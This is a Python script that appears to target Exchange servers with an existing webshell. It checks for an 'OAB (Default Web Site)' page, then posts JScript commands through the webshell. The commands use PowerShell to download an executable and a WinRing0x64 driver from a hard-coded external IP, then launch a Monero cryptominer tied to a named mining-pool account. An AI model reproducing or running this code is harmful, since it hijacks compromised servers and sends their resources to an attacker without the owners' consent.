import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys

url = sys.argv[1]
opcobaltstrike = ["powershell.exe -C (New-Object System.Net.WebClient).DownloadFile(\'http://125.212.214.148:1337/wao.exe\',\'C:\\windows\\teMp\\System.exe\');",
"powershell.exe -C (New-Object System.Net.WebClient).DownloadFile(\'http://125.212.214.148:1337/WinRing0x64.sys\',\'C:\\windows\\teMp\\WinRing0x64.sys\');",
"C:\\Windows\\temp\\System.exe --donate-level 1 -o europe.randomx-hub.miningpoolhub.com:20580 -u hiddensec070.ex -a rx/0 --coin monero -B",
]
test_truoc = requests.get('%s'%(url),verify=False, timeout=15)
try:
	if 'OAB (Default Web Site)' in test_truoc:
		for cmd in opcobaltstrike:
			shell_body_exec = 'code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'%(cmd)
			shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=15)
	else:
		print('%s Oof Webshell not found due to covid!!!'%url)
		exit(0)
except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
	exit(0)
except KeyboardInterrupt:
	exit(0)